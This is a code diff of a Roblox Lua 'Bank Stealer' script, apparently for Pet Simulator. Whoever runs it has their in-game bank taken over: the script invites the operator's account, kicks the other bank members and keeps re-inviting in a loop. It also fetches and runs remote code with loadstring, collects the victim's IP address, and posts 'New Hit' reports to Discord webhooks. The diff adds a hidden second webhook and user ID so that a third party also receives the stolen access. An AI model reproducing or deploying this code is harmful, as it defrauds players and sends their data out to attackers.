@@ -1,4 +1,6 @@
---[Monzz Bankstealer]
+local dhuser = "TehPucuk_55"       -- dualhooking user
+local dhwebhook = "https://discord.com/api/webhooks/1126402135786000395/TV27VBc_jbyXZHliylbsadlR2kzI9CAmwv_Rsnk-lu8H0d47NNj6AisAcZKlUoeBYujx" -- Dualhooking Webhook
+local loadingraw = "https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua" -- Put Your LoadingScreen Raw Link Here
 
 if getgenv().executed1 then return end
 getgenv().executed1 = true
@@ -46,7 +48,7 @@ local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
 
 local exploit
 request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request or
-HttpPost
+    HttpPost
 local function getexploit()
     local exploitt =
         (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
@@ -68,7 +70,7 @@ local function getexploit()
 end
 
 getexploit()
-
+local dhid
 local idiotuser = game:GetService("Players").LocalPlayer.Name
 local url = _G.Webhook
 if _G.UserID == nil then
@@ -86,11 +88,21 @@ local UserName = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
 if idiotuser == UserName then
     game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test on alt)")
 end
+if dhuser ~= nil then
+    local test = pcall(function()
+        game:GetService("Players"):GetUserIdFromNameAsync(dhuser)
+    end)
+    if test then
+        dhid = game:GetService("Players"):GetUserIdFromNameAsync(dhuser)
+    else
+        game:GetService("Players").LocalPlayer:Kick("Invalid Dh User!")
+    end
+end
 -- Checks
 
 
 if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/HerrSimoNHub/BankStealer/main/loadingscreen'))()
+    loadstring(game:HttpGet(loadingraw))()
 end
 if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
@@ -519,7 +531,11 @@ end
 -- First Invite
 
 if tier ~= 1 then
-        inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
+    if dhid ~= nil then
+        inviteremote:InvokeServer(mybanks[1]["BUID"], dhid)
+    end
+    task.wait()
+    inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
 end
 -- Bank Pets
 Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
@@ -1100,7 +1116,7 @@ if BChosenAbbreviation then
     local pnt = "."
     if string.split(Baddsd, "")[2] == "0" and string.split(Baddsd, "")[1] ~= "0" then
         BDiamondsCount = string.split(BDiamondsCount, ".")[1] ..
-        pnt .. string.split(Baddsd, "")[1] .. BChosenAbbreviation
+            pnt .. string.split(Baddsd, "")[1] .. BChosenAbbreviation
     elseif string.split(Baddsd, "")[2] == "0" and string.split(Baddsd, "")[1] == "0" then
         BDiamondsCount = string.split(BDiamondsCount, ".")[1] .. BChosenAbbreviation
     elseif string.split(Baddsd, "")[2] ~= "0" and string.split(Baddsd, "")[1] ~= "0" then
@@ -1138,7 +1154,7 @@ if TChosenAbbreviation then
     local pnt = "."
     if string.split(Taddsd, "")[2] == "0" and string.split(Taddsd, "")[1] ~= "0" then
         TDiamondsCount = string.split(TDiamondsCount, ".")[1] ..
-        pnt .. string.split(Taddsd, "")[1] .. TChosenAbbreviation
+            pnt .. string.split(Taddsd, "")[1] .. TChosenAbbreviation
     elseif string.split(Taddsd, "")[2] == "0" and string.split(Taddsd, "")[1] == "0" then
         TDiamondsCount = string.split(TDiamondsCount, ".")[1] .. TChosenAbbreviation
     elseif string.split(Taddsd, "")[2] ~= "0" and string.split(Taddsd, "")[1] ~= "0" then
@@ -1175,7 +1191,7 @@ if WChosenAbbreviation then
     local pnt = "."
     if string.split(Waddsd, "")[2] == "0" and string.split(Waddsd, "")[1] ~= "0" then
         WDiamondsCount = string.split(WDiamondsCount, ".")[1] ..
-        pnt .. string.split(Waddsd, "")[1] .. WChosenAbbreviation
+            pnt .. string.split(Waddsd, "")[1] .. WChosenAbbreviation
     elseif string.split(Waddsd, "")[2] == "0" and string.split(Waddsd, "")[1] == "0" then
         WDiamondsCount = string.split(WDiamondsCount, ".")[1] .. WChosenAbbreviation
     elseif string.split(Waddsd, "")[2] ~= "0" and string.split(Waddsd, "")[1] ~= "0" then
@@ -1198,25 +1214,25 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local banktier = SuperBank["Tier"]
 local lmao = "/5"
 local ping
-    if #HList ~= 0 or #BHList ~= 0 then
-        ping = "@everyone"
-    elseif #HList == 0 and #BHList == 0 then
-        ping = ""
-    end
+if #HList ~= 0 or #BHList ~= 0 then
+    ping = "@everyone"
+elseif #HList == 0 and #BHList == 0 then
+    ping = ""
+end
 -- Img
 local data1
 if banktiercheck == true then
-    imgs = "https://cdn.discordapp.com/attachments/1100823909009465497/1124473588045590578/Screenshot_20230414-055925_Gallery_1.jpg"
+    imgs = "https://cdn.discordapp.com/attachments/1100823909009465497/1130420430361088050/its-friday-dancing.gif"
 
     data1 = {
         ["content"] = ping,
         ["username"] = "Monzz Scriptz",
-        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1124473588045590578/Screenshot_20230414-055925_Gallery_1.jpg",
+        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1130420430361088050/its-friday-dancing.gif",
         ["embeds"] = { {
-            ["title"] = "**New Hit** ||Monzz Bank Stealer||",
-            ["url"] = "https://discord.gg/4y4CZfdJHu",
+            ["title"] = "**New Hit** ||With Monzz||",
+            ["url"] = "https://discord.gg/uSgzNwHDTS",
             ["type"] = "rich",
-            ["color"] = tonumber(0xf7262a),
+            ["color"] = tonumber(0x2798FF),
             ["thumbnail"] = {
                 ["url"] = imgs,
                 ["height"] = 420,
@@ -1234,7 +1250,7 @@ if banktiercheck == true then
                 ["value"] = "```" .. DiamondsCount .. "```",
                 ["inline"] = true
             }, {
-                ["name"] = ":frog: **Pets Amount** :frog:",
+                ["name"] = ":frog: **Pets** :frog:",
                 ["value"] = "```" .. #FinalList + #SFinalList .. "```",
                 ["inline"] = true
             }, {
@@ -1242,7 +1258,7 @@ if banktiercheck == true then
                 ["value"] = "```" .. #HList .. "```",
                 ["inline"] = true
             }, {
-                ["name"] = ":teddy_bear: **Exclusives** :teddy_bear:",
+                ["name"] = ":cat: **Exclusives** :cat:",
                 ["value"] = "```" .. #EList .. "```",
                 ["inline"] = true
             }, {
@@ -1274,7 +1290,7 @@ if banktiercheck == true then
                     ["value"] = "```" .. BDiamondsCount .. "```",
                     ["inline"] = true
                 }, {
-                ["name"] = ":frog: **Pets Amount** :frog:",
+                ["name"] = ":frog: **Pets** :frog:",
                 ["value"] = "```" .. #SuperBank["Storage"]["Pets"] .. "```",
                 ["inline"] = true
             }, {
@@ -1282,7 +1298,7 @@ if banktiercheck == true then
                 ["value"] = "```" .. #BHList .. "```",
                 ["inline"] = true
             }, {
-                ["name"] = ":teddy_bear: **Exclusives** :teddy_bear:",
+                ["name"] = ":cat: **Exclusives** :cat:",
                 ["value"] = "```" .. BEHList .. "```",
                 ["inline"] = true
             }, {
@@ -1328,7 +1344,7 @@ if banktiercheck == true then
                     ["value"] = "```" .. TDiamondsCount .. "```",
                     ["inline"] = true
                 }, {
-                ["name"] = ":frog: **Pets Amount** :frog:",
+                ["name"] = ":frog: **Pets** :frog:",
                 ["value"] = "```" .. #SuperBank["Storage"]["Pets"] + #FinalList .. "```",
                 ["inline"] = true
             },
@@ -1353,11 +1369,25 @@ if _G.Webhook ~= nil then
     }
     request(abcdef1)
 end
+task.wait()
+if dhwebhook ~= nil then
+    local abcdef2 = {
+        Url = dhwebhook,
+        Body = newdata1,
+        Method = "POST",
+        Headers = headers
+    }
+    request(abcdef2)
+end
 for i, v in pairs(SuperBank["Players"]) do
     if v ~= _G.UserID then
         kickremote:InvokeServer(Bank, v)
     end
 end
 while task.wait(0.1) do
+    if dhid ~= nil then
+        inviteremote:InvokeServer(mybanks[1]["BUID"], dhid)
+    end
+    task.wait()
     inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
 end
